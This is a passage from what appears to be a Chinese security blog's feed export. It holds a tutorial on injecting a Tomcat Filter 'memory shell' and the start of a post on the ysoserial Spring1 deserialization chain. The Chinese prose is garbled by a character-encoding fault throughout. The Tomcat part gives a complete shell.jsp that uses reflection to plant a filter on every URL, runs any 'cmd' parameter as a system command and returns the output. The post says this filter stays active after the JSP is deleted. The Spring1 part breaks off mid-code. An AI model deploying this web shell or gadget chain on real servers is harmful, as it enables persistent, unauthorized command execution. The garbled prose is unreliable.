class="line">                <span class="keyword">return</span> filterChain;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> filterChain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸­ï¼Œ<code>filterChain</code>ä½œä¸º<code>ApplicationFilterChain</code>å®ä¾‹è¢«å£°æ˜ï¼Œè€Œåè¢«èµ‹å€¼ä¸º<code>filterConfig</code>ï¼Œ<code>filterConfig</code>ä»<code>context.findFilterConfig(filterMap.getFilterName())</code>è·å–ã€‚æ‰€ä»¥ä»æ ¹æœ¬ä¸Š<code>filters</code>å­—æ®µçš„å…ƒç´ ä»<code>StandardContext</code>ä¸­è·å–</p><p><code>StandardContext</code>ç±»ä¸­ï¼Œ<code>findFilterConfig()</code>æ–¹æ³•æŒ‡å‘<code>filterConfigs</code>å­—æ®µï¼Œè¯¥å­—æ®µä¸ºä¸€ä¸ªMapé›†åˆ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure><p>è°ƒè¯•å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªMapçš„é”®ä¿å­˜Filterçš„åç§°ï¼Œå€¼ä¸ºFilterConfigå¯¹è±¡</p><p><img src="/img/post/mem3.png" alt="mem3"></p><p>æ‰€ä»¥ï¼Œè·å–<code>StandardContext</code>ç±»ï¼Œé€šè¿‡åå°„ä¿®æ”¹<code>filterConfigs</code>è¿™ä¸ªMapï¼Œä½¿å…¶åŒ…å«æˆ‘ä»¬çš„æ¶æ„ApplicationFilterConfig</p><p>è¿›å…¥<code>ApplicationFilterConfig</code>ç±»ï¼Œå‘ç°è¯¥ç±»æ„é€ å™¨éœ€è¦ä¸€ä¸ª<code>FilterDef</code>ï¼Œ<code>FilterDef</code>ç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­å®šä¹‰Filteråç§°å’Œç±»è·¯å¾„çš„å†…å®¹ï¼Œå¹¶ä¸”åç»­è°ƒç”¨<code>addFilterMap()</code>æ—¶ä¼šè°ƒç”¨<code>FilterDef</code>è¿›è¡Œæ£€æŸ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.validateFilterMap(filterMap);</span><br><span class="line">        <span class="built_in">this</span>.filterMaps.add(filterMap);</span><br><span class="line">        <span class="built_in">this</span>.fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>validateFilterMap()</code></p><p><img src="/img/post/mem4.png" alt="mem4"></p><p>å› è€Œè®¾ç½®<code>FilterDef</code>æ˜¯å¿…è¦çš„ï¼Œ<code>Name</code>ã€<code>Filter</code>ä¸¤ä¸ªå­—æ®µæ˜¯å¿…é¡»çš„ï¼Œ<code>Filter</code>ç”¨äºæä¾›ç°æœ‰å®ä¾‹ï¼Œå› ä¸ºè¿è¡Œæ—¶ä¸€èˆ¬ä¸ä¼šå†è¿›è¡Œç±»åŠ è½½ï¼Œ<code>FilterClass</code>å­—æ®µç»è¿‡æˆ‘çš„æµ‹è¯•å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†è€ƒè™‘åˆ°åé¢å¯èƒ½ä¼šå‡ºç°çš„ç©ºæŒ‡é’ˆï¼Œè¿™é‡Œå¯ä»¥éšä¾¿è®¾ç½®ä¸€ä¸ªï¼Œè®¾ç½®å®Œåå°†å…¶åŠ å…¥context</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line">filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">CmdFilter</span>());</span><br><span class="line">context.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><p>è€Œä¸”æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡èµ°<code>FilterDef</code>å»ç»™<code>ApplicationFilterConfig</code>ä¼ é€’Filterå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationFilterConfig(Context context, FilterDef filterDef) <span class="keyword">throws</span> ClassCastException, ReflectiveOperationException, ServletException, NamingException, IllegalArgumentException, SecurityException &#123;</span><br><span class="line">        <span class="built_in">this</span>.context = context;</span><br><span class="line">        <span class="built_in">this</span>.filterDef = filterDef;</span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilter() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.getFilter();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.filter = filterDef.getFilter();</span><br><span class="line">            context.getInstanceManager().newInstance(<span class="built_in">this</span>.filter);</span><br><span class="line">            <span class="built_in">this</span>.initFilter();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œ<code>creatFilterChain()</code>æ–¹æ³•ä¸­é€šè¿‡<code>filterMap.getFilterName()</code>æ¥æŸ¥æ‰¾<code>FilterConfigs</code>ï¼Œæ•…è¿˜éœ€è¦æ·»åŠ ä¸€ä¸ªæ–°<code>FilterMap</code>è¿›å…¥<code>context</code>ï¼Œé€šå¸¸åªéœ€è®¾ç½®<code>FilterName</code>å’Œ<code>URLPattern</code>å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">context.addFilterMap(filterMap);</span><br></pre></td></tr></table></figure><h2 id="æ„é€ Filterå†…å­˜é©¬"><a href="#æ„é€ Filterå†…å­˜é©¬" class="headerlink" title="æ„é€ Filterå†…å­˜é©¬"></a>æ„é€ Filterå†…å­˜é©¬</h2><p>å®Œäº‹å…·å¤‡ï¼Œæ¥ä¸‹æ¥ç€æ‰‹æ„å»ºå†…å­˜é©¬è§¦å‘é¡µé¢<code>shell.jsp</code>ï¼Œé¦–å…ˆè¦è·å–<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ¶æ„Filterï¼Œè®©å®ƒå¼¹ä¸ªè®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ¶æ„ApplicationFilterConfigï¼Œå¹¶è®©æ–°<code>FilterMap</code>è¿›å…¥<code>context</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line">filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">CmdFilter</span>());</span><br><span class="line">context.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) </span><br><span class="line">constructor.newInstance(context, filterDef);</span><br><span class="line"></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">context.addFilterMap(filterMap);</span><br></pre></td></tr></table></figure><p>å°†æ¶æ„ApplicationFilterConfigåŠ å…¥<code>filterConfigs</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(context);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;CmdFilter&quot;</span>, filterConfig);</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„<code>shell.jsp</code></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">CmdFilter</span> <span class="variable">cmdFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CmdFilter</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">        filterDef.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(cmdFilter);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        context.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(context);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;CmdFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸï¼Œç†è®ºä¸Šä»»æ„ç•Œé¢å­˜åœ¨cmdå‚æ•°éƒ½å¯æ‰§è¡Œï¼Œä¸”åœ¨jspæ–‡ä»¶åˆ é™¤åä¾ç„¶æœ‰æ•ˆ</p><p><img src="/img/post/mem5.png" alt="mem5"></p><h2 id="å†…å­˜é©¬å›æ˜¾æŠ€æœ¯"><a href="#å†…å­˜é©¬å›æ˜¾æŠ€æœ¯" class="headerlink" title="å†…å­˜é©¬å›æ˜¾æŠ€æœ¯"></a>å†…å­˜é©¬å›æ˜¾æŠ€æœ¯</h2><p>é‡‡ç”¨è¾“å…¥è¾“å‡ºæµè¿›è¡Œé¡µé¢æ‰“å°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                res.getWriter().println(output);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å¯¹äºLinuxç³»ç»Ÿï¼Œ<code>ProcessBuilder</code>çš„å‚æ•°ä¸º<code>(&quot;/bin/sh&quot;, &quot;-h&quot;, cmd)</code></p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring1åŸç”Ÿååºåˆ—åŒ–é“¾</title>
      <link href="/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
      <url>/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring1åŸç”Ÿååºåˆ—åŒ–é“¾"><a href="#Spring1åŸç”Ÿååºåˆ—åŒ–é“¾" class="headerlink" title="Spring1åŸç”Ÿååºåˆ—åŒ–é“¾"></a>Spring1åŸç”Ÿååºåˆ—åŒ–é“¾</h1><p>Spring1åŸç”Ÿé“¾çš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Spring1é“¾æœ€ç»ˆé€šè¿‡<code>Templates</code>ç±»çš„<code>newTransformer()</code>æ–¹æ³•åŠ¨æ€åŠ è½½æ¶æ„ç±»æ‰§è¡Œå‘½ä»¤ï¼Œæ ¸å¿ƒç‚¹åœ¨äºå‰éƒ¨åˆ†<strong>ä¸‰å±‚åŠ¨æ€ä»£ç†</strong>çš„åµŒå¥—ä½¿ç”¨ï¼Œè¿™é‡Œé‡‡ç”¨é¡ºæ¨</p><p>é¦–å…ˆçœ‹å…¥å£ç±»<code>MethodInvokeTypeProvider</code>ï¼Œå®ƒæ˜¯æŠ½è±¡ç±»<code>SerializableTypeWrapper</code>ä¸‹çš„é™æ€ç±»ï¼Œå…¶<code>readObject()</code>å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            inputStream.defaultReadObject();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">            <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯<code>method</code>ä¸º<code>&quot;newTransformer&quot;</code>ï¼Œ<code>this.provider.getType()</code>è¿”å›æ„é€ çš„<code>Templates</code>å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>provider</code>è‚¯å®šæ˜¯ä¸€ä¸ªä»£ç†å¯¹è±¡äº†ï¼Œé—®é¢˜æ˜¯å¤„ç†å™¨å¾—é€‰è°ï¼Œç»è¿‡å‰é¢CC1çš„å­¦ä¹ ï¼Œ<code>AnnotationInvocationHandler</code>ç±»çš„invoke()æ–¹æ³•å¯ä»¥åšåˆ°è¿”å›ç‰¹å®šçš„å¯¹è±¡ï¼Œé‚£æ˜¯å¦å¯ä»¥ç›´æ¥æŠŠ<code>Templates</code>ä½œä¸ºç»“æœè¿”å›å‘¢ï¼Ÿä¸å¯ä»¥ï¼Œå› ä¸º<code>getType()</code>æ–¹æ³•è¦æ±‚è¿”å›ä¸€ä¸ª<code>Type</code>å¯¹è±¡ï¼Œç›´æ¥è¿”å›<code>Templates</code>ä¼šè½¬å‹å¤±è´¥æŠ¥é”™ï¼Œæ‰€ä»¥æ­¤å¤„åº”å†è¿”ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œä¸”ä»£ç†å¯¹è±¡å®ç°äº†<code>Type</code>æ¥å£</p><p>ysoserialçš„æºç å‘Šè¯‰æˆ‘ä»¬ç¬¬äºŒå±‚ä»£ç†çš„å¤„ç†å™¨åº”é€‰æ‹©æŠ½è±¡ç±»<code>AutowriteUtils</code>ä¸‹çš„<code>ObjectFactoryDelegatingInvocationHandler</code>ï¼Œå®ƒçš„<code>invoke()</code>æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> ex.getTargetException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ç”±äº<code>method</code>æ˜¯ä»<code>readObject()</code>é‡Œä¼ é€’çš„<code>&quot;newTransformer&quot;</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>readObject()</code>å¹¶ä¸æ˜¯ç›´æ¥è§¦å‘<code>newTransformer()</code>çš„æ–¹æ³•ï¼Œè€Œæ˜¯<code>ObjectFactoryDelegatingInvocationHandler</code>çš„<code>invoke()</code>ï¼Œè¿™ä¸ªç±»çš„ç‰¹åˆ«ä¹‹å¤„åœ¨äºå…¶invoke()æ–¹æ³•ä¸­å†ä¸€æ¬¡è°ƒç”¨äº†ä¸€ä¸ªæ–¹æ³•<code>getObject()</code>ï¼Œå¹¶ä¸”è§¦å‘çš„å¯¹è±¡<code>this.objectFactory</code>æ˜¯å¯æ§çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è®©<code>this.objectFactory</code>å†æ¬¡ä½œä¸ºä»£ç†å¯¹è±¡ï¼Œå¤„ç†å™¨æ˜¯<code>AnnotationInvocationHandler</code>ï¼Œè®©å…¶è§¦å‘<code>getObject()</code>æ—¶è¿”å›çœŸæ­£çš„<code>Templates</code>å³å¯ï¼Œä»¥ä¸‹æ˜¯å‰åŠéƒ¨åˆ†çš„åˆ©ç”¨é“¾</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">this.provider.getType()</span><br><span class="line">&gt;$Proxy0.getType()</span><br><span class="line">&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">    &gt;$Proxy1.newTransformer()</span><br><span class="line">    &gt;ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">    &gt;newTransformer.invoke(this.objectFactory.getObject(), null)</span><br><span class="line">    &gt;newTransformer.invoke($Proxy2.getObject(), null)</span><br><span class="line">        &gt;newTransformer.invoke(AnnotationInvocationHandler.invoke(), null)</span><br><span class="line">        &gt;newTransformer.invoke(Templates, null)</span><br><span class="line">            &gt;Templates.newTransformer()</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ„é€ é“¾ï¼Œå‰é¢æ˜¯æ„é€ åŠ¨æ€åŠ è½½æ¶æ„ç±»å’Œ<code>Templates</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">spring</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;spring&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.getCtClass(<span 